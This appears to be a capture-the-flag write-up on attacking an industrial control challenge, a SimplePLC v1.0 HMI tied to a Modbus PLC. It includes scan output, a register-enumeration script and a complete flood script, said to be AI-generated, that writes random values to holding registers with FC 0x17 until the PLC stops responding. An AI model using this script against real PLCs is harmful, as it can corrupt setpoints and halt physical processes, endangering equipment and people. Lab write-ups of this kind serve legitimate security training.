Same as usual I will perform a full scan of all the TCP ports open on the machine.

```bash
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Werkzeug httpd 3.0.1 (Python 3.9.18)
|_http-server-header: Werkzeug/3.0.1 Python/3.9.18
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
|_http-favicon: Unknown favicon MD5: 309D35C9DFD67E652C06B2A79425B50F
| http-title: SimplePLC v1.0 - Log-in
|_Requested resource was /panel/login
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=4/21%OT=80%CT=%CU=43095%PV=Y%DS=2%DC=T%G=N%TM=69E7CEE5
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=9)OPS(
OS:O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11
OS:NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%R
OS:UD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 71.855 days (since Sun Feb  8 23:53:48 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   861.43 ms 192.168.255.1
2   861.44 ms 172.19.1.8


```

# HTTP

My enumeration script shows that the PLC tied to this HMI is on the IP .9:

![656b160e6589544ff064e260f1361a6d.png](../../../_resources/656b160e6589544ff064e260f1361a6d.png)

```python
import socket
import struct
import time

targets = ["172.19.5.3", "172.19.5.7", "172.19.5.9", "172.19.5.11", "172.19.5.13"]

# Focus on the block identified in the .9 dashboard
START_ADDR = 1000
REG_COUNT = 60 

def get_modbus(ip, fc, addr, count):
    # FC 01=Coils, 02=Discrete In, 03=Holding, 04=Input
    payload = struct.pack(">HHHBBHH", 0x0001, 0x0000, 0x0006, 0x01, fc, addr, count)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.6)
        s.connect((ip, 502))
        s.send(payload)
        response = s.recv(2048)
        s.close()
        if len(response) >= 9:
            data_bytes = response[9:]
            if fc in [1, 2]: # Bit-based
                return list(bin(int.from_bytes(data_bytes, 'big'))[2:].zfill(count))[::-1]
            return struct.unpack(f">{len(data_bytes)//2}H", data_bytes)
    except: return None
    return None

for ip in targets:
    print(f"\n--- AUDIT: {ip} (Block {START_ADDR}-{START_ADDR+REG_COUNT}) ---")
    print(f"{'Address':<8} | {'Holding (FC03)':<15} | {'Status'}")
    print("-" * 45)
    
    h_regs = get_modbus(ip, 3, START_ADDR, REG_COUNT)
    
    if h_regs:
        for i, val in enumerate(h_regs):
            if val != 0:
                addr = i + START_ADDR
                marker = ""
                if val == 11100: marker = " <--- TARGET: BOIL_TIME"
                if val == 5 and addr == 1052: marker = " <--- BEER_FLOW_SP"
                print(f"{addr:<8} | {val:<15} | {marker}")
    else:
        print(f"{' ':^45} [!] OFFLINE / BUSY")
    time.sleep(0.05)
```

Now I suspect the challenge is well described here:

![2f647e4783225e8e0cc3a95c173510b1.png](../../../_resources/2f647e4783225e8e0cc3a95c173510b1.png)

Now the goal I guess is to flip **both discrete_in.03 overflow_sensor** & **discrete_in.08 empty_tank_sensor** to true and that will print the message error.

Now to be sure I am not talking shit I interrogated the discrete input 3 & 8 that right now shows 0 aka false:

![c48721a9d1429d4ae755435b40a84f68.png](../../../_resources/c48721a9d1429d4ae755435b40a84f68.png)

# Second Attempt

Now I am back on this challenge and while I know what i am supposed to archive in order to print the flag, I immeditely can see that this is the v1.0 of the SimplePLC:  
![1552731659ee97e7b16aec01024eb517.png](../../../_resources/1552731659ee97e7b16aec01024eb517.png)

Now in one of the documents it was written that up to version 2.1 there should be this bug?  
![d5378b86f3ec819a6a6207734df8d3f3.png](../../../_resources/d5378b86f3ec819a6a6207734df8d3f3.png)

Now since this is the loading function i suspect I need to DOS the PLC and the caste of cards will fall down.. Now I understand that this vulnerability is about the last 2 options where you can write mutiple registries in one go.

| FC  | Hex | Name | Data Type | Access | Classic Address Range |
| --- | --- | --- | --- | --- | --- |
| **01** | `0x01` | Read Coils | 1-bit (boolean) | Read | 00001 – 09999 |
| **02** | `0x02` | Read Discrete Inputs | 1-bit (boolean) | Read-only | 10001 – 19999 |
| **03** | `0x03` | Read Holding Registers | 16-bit (word) | Read/Write | 40001 – 49999 |
| **04** | `0x04` | Read Input Registers | 16-bit (word) | Read-only | 30001 – 39999 |
| **05** | `0x05` | Write Single Coil | 1-bit (boolean) | Write | 00001 – 09999 |
| **06** | `0x06` | Write Single Register | 16-bit (word) | Write | 40001 – 49999 |
| **15** | `0x0F` | Write Multiple Coils | N × 1-bit | Write | 00001 – 09999 |
| **16** | `0x10` | Write Multiple Registers | N × 16-bit | Write | 40001 – 49999 |

Now I understand that the goal is to loop more than 100 FC 16 requests(aka write multiple registries, untill the CPU floods). This is also defined in the official spreadsheet:

![811bca37bcc4f811ebc1ff5f3ebd68e7.png](../../../_resources/811bca37bcc4f811ebc1ff5f3ebd68e7.png)

Here i asked Gemini to produce a script that concurrently sends more than 100 RW Multiple register (0x17) calls to the HR:

```python
#!/usr/bin/env python3

import sys
import random
from pyModbusTCP.client import ModbusClient

# Setup target from command line
if len(sys.argv) < 2:
    print("Usage: python3 exploit.py <PLC_IP>")
    sys.exit(1)

target_ip = sys.argv[1]

# Initialize Client
# auto_open=True keeps the connection alive to fill the buffer faster
c = ModbusClient(host=target_ip, port=502, auto_open=True, auto_close=False)

print(f"[*] Targeting {target_ip} with FC 0x17 (Read/Write Multiple)")
print("[*] Writing to registers 0-100 with random data...")

packet_count = 0

try:
    while True:
        # Generate 100 random values to see the 'live' change in your UI
        random_values = [random.randint(0, 65535) for _ in range(100)]
        
        # FC 0x17: Read 100 registers and Write 100 registers
        # This is the 'High' processing speed trigger
        response = c.write_read_multiple_registers(
            write_addr=0, 
            write_values=random_values, 
            read_addr=0, 
            read_nb=100
        )
        
        if response is not None:
            packet_count += 1
            # Print every packet so you can see the exact moment it hits > 100
            print(f"Packet [{packet_count}] sent. Last value written: {random_values[0]}")
        else:
            print(f"\n[!] PLC STOPPED RESPONDING at packet {packet_count}")
            print("[!] Logic should be frozen. Check the bottling line.")
            break

except KeyboardInterrupt:
    print("\n[!] User stopped the script.")
except Exception as e:
    print(f"\n[!] Error: {e}")
```

And after several tests I can see this:  
![f216b9ab1b97722cca292620c393b2cc.png](../../../_resources/f216b9ab1b97722cca292620c393b2cc.png)

And finally I have the flag:  
![8c7f98a8ef3b482204e082bd6a6af407.png](../../../_resources/8c7f98a8ef3b482204e082bd6a6af407.png)

&nbsp;